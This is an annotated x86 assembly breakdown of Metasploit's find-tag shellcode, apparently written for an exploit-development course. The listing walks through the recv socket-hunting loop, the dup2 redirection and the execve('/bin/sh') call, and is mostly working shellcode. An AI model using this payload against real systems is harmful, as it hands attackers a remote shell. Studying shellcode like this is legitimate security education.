; shell_find_tag shellcode from msfvenom


xor    ebx,ebx	; Clearing out the ebx register to further store the sockfd. EBX = 0
push   ebx		; Pushing EBX on the stack
mov    esi,esp	; Moving stack pointer which is pointing to 0x0 in ESI
push   0x40		; Pushing 0x40 on the stack
mov    bh,0xa	; Pushing 0xa in the higher byte of EBX. EBX = 0xa00
push   ebx		; Pushing EBX on the stack (0xa00)
push   esi		; Pushing ESI on the stack (0x0)
push   ebx		; Pushing EBX on the stack (0xa00)
mov    ecx,esp	; Moving stack pointer in ECX. Which is currently pointing to all the arguments of recv
xchg   bl,bh	; Exchanging bh with bl. EBX = 0xa

; ssize_t recv(int sockfd, void *buf, size_t len, int flags);
; recv(0xa01, *0xbff23c, 0xa00, 0x40)


;_____________________________xx________________________________
; EAX = 0x0 ; Syscall number (Yet to be addressed in the memory)|
; EBX = 0xa (10)	; sockfd									|
; ECX = Pointer to 11, Null	; Addres to store received bytes	|
; EDX = Null	; flags											|
;_____________________________xx________________________________|

inc_socket:
	inc    WORD PTR [ecx] ; EBX = 0xa01
	push   0x66		; Pushing 102 on the stack
	pop    eax		; Popping the value in EAX. EAX = 102  (Syscall - socketcall)                                                                                                    
	int    0x80		; Call to syscall Socketcall (EBX = 10 = sys_recv)

	cmp    DWORD PTR [esi],0x45414c53 ; Comparing "SLAE" (reversed little endian) tag with received 
	jne    0x804a050 <buf+16> ; Jump to label inc_socket if tag not found

pop    edi 		; Pop the top of the stack (socket file descriptor) in EDI if tag found
mov    ebx,edi  ; Move the (socket file descriptor) in EBX to execute the dup2 syscall
push   0x2 		; Pushing 2 on top of the stack as a start point of dup2 iterator
pop    ecx 		; Popping 2 in ECX

dup2_iterator:
	push   0x3f		; Pushing 63 (dup2 syscall) on the stack
	pop    eax		; Loading 63 in EAX for syscall invocation
	int    0x80		; Calling syscall dup2
	dec    ecx		; Decrementing ECX. ECX = 1
	jns    0x804a066 <buf+38>	; Jump to label dup2_iterator until we hit signed flag (-1)

; Execve syscall (spawning shell)

push   0xb			; Pushing 11 on the stack (execve syscall)
pop    eax			; Popping 11 in EAX. EAX = 11
cdq    				; Clearing out EDX register
push   edx			; Pushing null on the stack
push   0x68732f2f	; Pushing "//sh" on the stack (reverse little endian)
push   0x6e69622f	; Pushing "/bin" on the stack (reverse little endian)
mov    ebx,esp		; Moving stack pointer (//bin/sh NULL) in EBX
push   edx			; Pushing EDX (Null) on the stack
push   ebx			; Pushing EBX (Null terminated binary to execute)
mov    ecx,esp		; Moving stack pointer to ECX (//bin/sh NULL)
int    0x80			; Calling syscall execve
